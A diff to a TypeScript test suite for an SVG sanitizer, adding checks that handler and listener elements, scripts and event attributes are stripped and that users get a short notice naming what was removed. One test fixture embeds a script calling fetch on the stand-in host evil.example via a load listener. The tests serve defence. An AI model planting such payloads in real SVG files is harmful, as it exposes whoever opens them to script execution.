@@ -15,6 +15,7 @@ import {
   sanitizeSvgSource,
   sniffRasterMime,
   SVG_SANITIZER_RULES,
+  svgSanitizerNotice,
   transferCarriesFiles,
 } from "./designAttachments";
 import type { DesignAttachment } from "./designHost";
@@ -269,7 +270,33 @@ describe("the SVG sanitizer", () => {
       "foreignObject",
       "script",
     ]);
-    expect(SVG_SANITIZER_RULES.script).toContain("privileges");
+    expect(SVG_SANITIZER_RULES.script.reason).toContain("privileges");
+  });
+
+  it("gives every rule a user-facing label and a reason, from one definition", () => {
+    for (const [rule, definition] of Object.entries(SVG_SANITIZER_RULES)) {
+      expect(definition.label, rule).not.toBe("");
+      expect(definition.reason, rule).not.toBe("");
+      // A label names a thing that was taken out; a reason argues for the rule.
+      expect(definition.label, rule).not.toBe(definition.reason);
+    }
+  });
+
+  it("removes the SVG 1.2 handler and listener elements with their subtree", () => {
+    // Nothing today executes these two, which is exactly the argument for not
+    // leaning on today: the pass keeps what it has examined, and these carry
+    // behaviour without having been examined.
+    const result = sanitizeSvgSource(
+      '<svg xmlns="http://www.w3.org/2000/svg"><handler id="h" type="text/ecmascript">fetch("http://evil.example")</handler><listener event="load" handler="#h"/><rect/></svg>',
+    );
+    if (!result.ok) throw new Error(result.reason);
+
+    expect(result.source).not.toContain("<handler");
+    expect(result.source).not.toContain("<listener");
+    // The text the handler carried goes with it.
+    expect(result.source).not.toContain("evil.example");
+    expect(result.source).toContain("<rect");
+    expect(result.removed).toEqual(["svg12Handler"]);
   });
 
   it("takes the script and the foreignObject with their content", () => {
@@ -401,6 +428,53 @@ describe("the SVG sanitizer", () => {
 
   it("gives a reason instead of a crash for an empty string", () => {
     expect(sanitizeSvgSource("")).toMatchObject({ ok: false });
+  });
+});
+
+describe("what the composer says about a file it sanitized", () => {
+  it("names every rule that fired, once each, in one sentence", () => {
+    const notice = svgSanitizerNotice("logo.svg", ["script", "eventHandler", "externalReference"]);
+
+    expect(notice).toBe(
+      "logo.svg was sanitized before attaching: a script, an event handler and a link to another site were removed.",
+    );
+    for (const label of ["a script", "an event handler", "a link to another site"]) {
+      expect(notice.split(label)).toHaveLength(2);
+    }
+    // The rules' reasons belong in the source, not under a dropped logo.
+    expect(notice).not.toContain("privileges");
+    expect(notice).not.toContain("<script>");
+    // The six lines this replaced ran to 430 characters.
+    expect(notice.length).toBeLessThan(200);
+  });
+
+  it("reads as a list of one rather than a broken list", () => {
+    const notice = svgSanitizerNotice("logo.svg", ["script"]);
+
+    expect(notice).toBe("logo.svg was sanitized before attaching: a script was removed.");
+    expect(notice).not.toContain(" and");
+    expect(notice).not.toContain(", ");
+  });
+
+  it("has nothing to say when no rule fired", () => {
+    expect(svgSanitizerNotice("logo.svg", [])).toBe("");
+  });
+
+  it("names a rule once even when it fires on several elements", async () => {
+    const result = await importDesignAttachments(
+      [
+        svgFile(
+          "logo.svg",
+          '<svg xmlns="http://www.w3.org/2000/svg" onload="a()" onclick="b()"><script>c()</script><script>d()</script><rect/></svg>',
+        ),
+      ],
+      [],
+    );
+
+    expect(result.attachments).toHaveLength(1);
+    expect(result.notices).toEqual([
+      "logo.svg was sanitized before attaching: a script and an event handler were removed.",
+    ]);
   });
 });
 
